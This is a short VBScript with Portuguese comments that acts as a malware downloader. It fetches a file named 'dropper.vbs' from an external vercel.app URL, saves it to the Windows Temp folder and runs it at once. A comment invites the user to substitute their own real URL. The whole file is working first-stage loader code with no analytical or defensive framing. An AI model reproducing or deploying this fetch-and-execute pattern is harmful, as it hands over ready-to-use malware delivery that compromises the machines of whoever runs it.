Option Explicit

Dim urlDropper, destinoDropper, http, fso, arquivo

urlDropper = "https://testando123-blond.vercel.app/dropper.vbs"  ' Altere para sua URL real
destinoDropper = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\dropper.vbs" ' Pasta Temp

Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", urlDropper, False
http.Send

If http.Status = 200 Then
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set arquivo = fso.CreateTextFile(destinoDropper, True)
    arquivo.Write http.responseText
    arquivo.Close
    
    ' Executa o dropper baixado
    CreateObject("WScript.Shell").Run Chr(34) & destinoDropper & Chr(34), 1, False
Else
    MsgBox "Falha ao baixar o dropper: " & http.Status
End If
